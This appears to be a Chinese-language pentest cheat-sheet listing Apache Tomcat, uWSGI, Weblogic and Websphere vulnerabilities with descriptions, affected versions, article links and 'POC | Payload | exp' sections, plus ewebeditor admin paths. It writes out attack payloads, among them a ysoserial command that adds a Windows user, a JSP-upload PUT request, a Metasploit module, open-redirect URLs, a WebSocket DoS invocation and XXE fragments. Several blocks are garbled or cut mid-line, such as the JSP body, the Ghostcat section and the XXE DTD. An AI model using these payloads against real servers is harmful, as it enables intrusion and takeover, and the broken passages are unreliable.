- POC | Payload | exp
    - [Apache Tomcat 8/7/6 (Debian-Based Distros) - Local Privilege Escalation](https://www.exploit-db.com/exploits/40450/)
**CVE-2016-8735**
- 描述
    Oracle 修复了 JmxRemoteLifecycleListener 反序列化漏洞(CVE-2016-3427)。 Tomcat 也使用了 JmxRemoteLifecycleListener 这个监听器,但是 Tomcat 并没有及时升级，存在这个远程代码执行漏洞。
- 漏洞利用条件
    外部需要开启 JmxRemoteLifecycleListener 监听的 10001 和 10002 端口来实现远程代码执行。
- 影响版本
    - Tomcat 9.0.0.M1 ~ 9.0.0.M11
    - Tomcat 8.5.0 ~ 8.5.6
    - Tomcat 8.0.0.RC1 ~ 8.0.38
    - Tomcat 7.0.0 ~ 7.0.72
    - Tomcat 6.0.0 ~ 6.0.47
- 相关文章
    - [复现tomcat远程代码执行漏洞（CVE-2016-8735） | 回忆飘如雪](http://gv7.me/articles/2018/CVE-2016-8735/)
    - [CVE-2016-8735环境搭建到POC编写](https://blog.spoock.com/2019/09/20/cve-2016-8735/)
- POC | Payload | exp
    ```
    java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.48.211 10001 Groovy1 "C:\Windows\System32\net.exe user  test 12345 /add "
    ```
**CVE-2017-12615/12616**
- 描述
    2017年9月19日,Apache Tomcat 官方确认并修复了两个高危漏洞,漏洞 CVE 编号:CVE-2017-12615 和 CVE-2017-12616,该漏洞受影响版本为7.0.0-7.0.80之间,官方评级为高危,在一定条件下,攻击者可以利用这两个漏洞,获取用户服务器上 JSP 文件的源代码,或是通过精心构造的攻击请求,向用户服务器上传恶意 JSP 文件,通过上传的 JSP 文件 ,可在用户服务器上执行任意代码,从而导致数据泄露或获取服务器权限,存在高安全风险.
    - CVE-2017-12615:远程代码执行漏洞
        当 Tomcat 运行在 Windows 操作系统时,且启用了 HTTP PUT 请求方法 (例如,将 readonly 初始化参数由默认值设置为 false) ,攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件,JSP文件中的恶意代码将能被服务器执行.导致服务器上的数据泄露或获取服务器权限.
    - CVE-2017-12616:信息泄露漏洞
        当 Tomcat 中启用了 VirtualDirContext 时,攻击者将能通过发送精心构造的恶意请求,绕过设置的相关安全限制,或是获取到由 VirtualDirContext 提供支持资源服务的 JSP 源代码,从而造成代码信息泄露.
- 漏洞利用条件
    - CVE-2017-12615 漏洞利用需要在 Windows 环境,且需要将 readonly 初始化参数由默认值设置为 false,经过实际测试,Tomcat 7.x 版本内 web.xml 配置文件内默认配置无 readonly 参数,需要手工添加,默认配置条件下不受此漏洞影响.
    - CVE-2017-12616 漏洞需要在 server.xml 文件配置 VirtualDirContext 参数,经过实际测试,Tomcat 7.x 版本内默认配置无 VirtualDirContext 参数,需要手工添加,默认配置条件下不受此漏洞影响.
- 影响版本
    - CVE-2017-12615 影响版本 : Apache Tomcat 7.0.0 ~ 7.0.79 (windows 环境)
    - CVE-2017-12616 影响版本 : Apache Tomcat 7.0.0 ~ 7.0.80
- 相关文章
    - [CVE-2017-12615/CVE-2017-12616:Tomcat信息泄漏和远程代码执行漏洞分析报告](https://paper.seebug.org/399/)
- POC | Payload | exp
    - [iBearcat/CVE-2017-12615](https://github.com/iBearcat/CVE-2017-12615)
    - [breaktoprotect/CVE-2017-12615](https://github.com/breaktoprotect/CVE-2017-12615)
    ```
    PUT /1.jsp/ HTTP/1.1
    Host: your-ip:8080
    Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 5
    [+] JSP upload successfully."); %>
    ```
**CVE-2017-12617**
- 描述
    运行启用了 HTTP PUT 的 Apache Tomcat 特定版本时(例如，通过将默认 servlet 的只读初始化参数设置为 false)可以通过特制请求将 JSP 文件上载到服务器。然后可以请求此 JSP，并且服务器将执行其中包含的所有代码。
- 影响版本
    - Apache Tomcat 7.0.0 ~ 7.0.81
    - Apache Tomcat 8.0.0 ~ 8.0.17
- 相关文章
    - [CVE-2017-12617-Tomcat远程代码执行漏洞复现测试](https://www.freebuf.com/vuls/150203.html)
- POC | Payload | exp
    - [cyberheartmi9/CVE-2017-12617](https://github.com/cyberheartmi9/CVE-2017-12617)
- MSF Module
    ```
    use exploit/multi/http/tomcat_jsp_upload_bypass
    ```
**CVE-2018-11784 Tomcat URL跳转漏洞**
- 描述
    当 Apache Tomcat 版本 9.0.0.M1 到 9.0.11、8.5.0 到 8.5.33 和 7.0.23 到 7.0.90 中的默认 servlet 返回到一个目录的重定向（例如，当用户请求'/foo'时重定向到'/foo/’），一个特制的 URL 可用于导致重定向生成到攻击者选择的任何 URI。
- 影响版本
    - Apache Tomcat 9.0.0.M1 ~ 9.0.11
    - Apache Tomcat 8.5.0 ~ 8.5.33
    - Apache Tomcat 7.0.23 ~ 7.0.90
- 相关文章
    - [Tomcat URL跳转漏洞【CVE-2018-11784】](https://mp.weixin.qq.com/s/9SFInsxPkuNcaONx8CFSaQ)
- POC | Payload | exp
    ```
    http://[ip:port]//[baidu.com]/..;/[可访问目录/可访问目录]
    ```
    默认存在的 docs 目录也可以被利用，例
    ```
    http://[ip:port]//[baidu.com]/..;/docs/images
    ```
**CVE-2019-0232**
- 描述
    该漏洞是由于 Tomcat CGI 将命令行参数传递给 Windows 程序的方式存在错误，使得 CGIServlet 被命令注入影响。
    该漏洞只影响 Windows 平台，要求启用了 CGIServlet 和 enableCmdLineArguments 参数。但是 CGIServlet 和 enableCmdLineArguments 参数默认情况下都不启用。
- 影响版本
    - Apache Tomcat 7.0.0 ~ 7.0.93
    - Apache Tomcat 8.0.0 ~ 8.5.39
    - Apache Tomcat 9.0.1 ~ 9.0.17
- 相关文章
    - [CVE-2019-0232:Apache Tomcat RCE漏洞分析](https://xz.aliyun.com/t/4875)
    - [复现CVE-2019-0232过程中遇到的坑 Apache Tomcat高危远程代码执行漏洞](http://www.nmd5.com/?p=375)
- POC | Payload | exp
    - [pyn3rd/CVE-2019-0232](https://github.com/pyn3rd/CVE-2019-0232)
    - [jas502n/CVE-2019-0232](https://github.com/jas502n/CVE-2019-0232)
**CVE-2020-1938 && CNVD-2020-10487 Apache Tomcat Ghostcat 漏洞**
- 描述
    Apache Tomcat 会开启 AJP 连接器,方便与其他 Web 服务器通过 AJP 协议进行交互。由于 Tomcat 本身也内含了 HTTP 服务器，因此也可以视作单独的 Web 服务器。
    但 Apache Tomcat在 AJP 协议的实现上存在漏洞,导致攻击者可以通过发送恶意的 AJP 请求,可以读取或者包含 Web 应用根目录下的任意文件,如果配合文件上传任意格式文件，将可能导致任意代码执行(RCE).该漏洞利用 AJP 服务端口实现攻击,未开启 AJP 服务对外不受漏洞影响（tomcat 默认将 AJP 服务开启并绑定至 0.0.0.0/0）。
    此漏洞为文件包含漏洞，攻击者可利用该漏洞读取或包含 Tomcat 上所有 webapp 目录下的任意文件，如：webapp 配置文件、源代码等。
- 影响版本
    - Apache Tomcat = 6
    - 7 /conf/service.xml`,注释掉如下行：
        ```xml
        ```
        修改完后，重启 tomcat 即可。
    - 除以上措施外，也可采用防火墙等方法阻止不可信任的来源访问 Tomcat AJP Connector 端口。
**tomcat cluster sync-session**
- 描述
    tomcat 使用了自带 session 同步功能时，不安全的配置（没有使用 EncryptInterceptor）导致存在的反序列化漏洞，通过精心构造的数据包，可以对使用了 tomcat 自带 session 同步功能的服务器进行攻击。
- POC | Payload | exp
    - [threedr3am/tomcat-cluster-session-sync-exp](https://github.com/threedr3am/tomcat-cluster-session-sync-exp)
**CVE-2020-9484 Session 反序列化代码执行漏洞**
- 描述
    当使用 tomcat 时，如果使用了 tomcat 提供的 session 持久化功能，如果存在文件上传功能，恶意请求者通过一个流程，将能发起一个恶意请求造成服务端远程命令执行。
- 相关文章
    - [CVE-2020-9484 Tomcat RCE漏洞分析](https://mp.weixin.qq.com/s/OGdHSwqydiDqe-BUkheTGg)
    - [CVE-2020-9484: Apache Tomcat Remote Code Execution Vulnerability Alert](https://meterpreter.org/cve-2020-9484-apache-tomcat-remote-code-execution-vulnerability-alert/)
- POC | Payload | exp
    - [IdealDreamLast/CVE-2020-9484](https://github.com/IdealDreamLast/CVE-2020-9484)
    - [masahiro331/CVE-2020-9484](https://github.com/masahiro331/CVE-2020-9484)
**CVE-2020-13935**
- 描述
    Apache Tomcat 中的 WebSocket 存在安全漏洞，该漏洞源于程序没有正确验证 payload 的长度。攻击者可利用该漏洞造成拒绝服务（无限循环）。
- 影响版本
    - Apache Tomcat 10.0.0-M1-10.0.0-M6
    - Apache Tomcat 9.0.0.M1-9.0.36
    - Apache Tomcat 8.5.0-8.5.56
    - Apache Tomcat 7.0.27-7.0.104
- 相关文章
    - [CVE-2020-13935复现与浅析](https://www.freebuf.com/vuls/256004.html)
- POC | Payload | exp
    - [RedTeamPentesting/CVE-2020-13935](https://github.com/RedTeamPentesting/CVE-2020-13935)
        ```
        CVE-2020-13935.exe ws://x.x.x.x:xxxx/examples/websocket/echoStrreamAnnotation
        ```
---
### uWSGI
**uWSGI 未授权访问漏洞**
- 相关文章
    - https://github.com/vulhub/vulhub/blob/master/uwsgi/unacc/README.zh-cn.md
---
### Weblogic
- [Weblogic](./实验/Weblogic.md)
---
### Websphere
**CVE-2014-0910**
- POC | Payload | exp
    - [IBM Websphere Portal - Persistent Cross-Site Scripting](https://www.exploit-db.com/exploits/36941)
**CVE-2015-7450**
- POC | Payload | exp
    - [websphere_rce.py](https://github.com/Coalfire-Research/java-deserialization-exploits/blob/master/WebSphere/websphere_rce.py)
    - [websphereCVE-2015-7450](http://www.zstreamer.cn/2020/07/19/websphere-cve-2015-7450/)
**CVE-2019-4279 Websphere ND远程命令执行**
- 相关文章
    - [Websphere ND远程命令执行分析以及构造RpcServerDispatcher Payload(CVE-2019-4279) ](https://xz.aliyun.com/t/6394)
**CVE-2020-4643 WebSphere XXE 漏洞**
- 相关文章
    - [WebSphere XXE 漏洞分析(CVE-2020-4643)](https://paper.seebug.org/1342/)
- POC | Payload | exp
    ```
    xml如下：
    %bbb;
    ]>
    &ddd;
    xx.dtd如下：
    '>'>%ccc;
    ```
**Websphere Portal ssrf**
- 相关文章
    - [Turning bad SSRF to good SSRF: Websphere Portal](https://blog.assetnote.io/2021/12/26/chained-ssrf-websphere/)
---
## 组件
### 编辑器
**手册**
- [编辑器漏洞手册](https://navisec.it/%e7%bc%96%e8%be%91%e5%99%a8%e6%bc%8f%e6%b4%9e%e6%89%8b%e5%86%8c/)
#### ewebeditor
> 官网 : http://www.ewebeditor.net/
**相关文章**
- [ewebeditor 编辑器漏洞总结](https://www.0dayhack.com/post-426.html)
**常用路径**
```
Admin_Login.asp
Admin_Default.asp
Admin_Style.asp
Admin_UploadFile.asp
Upload.asp
Admin_ModiPwd.asp
eWebEditor.asp
db/ewebeditor.mdb
ewebeditor/login_admin.asp
eweb/login_admin.asp
editor/login_admin.asp
```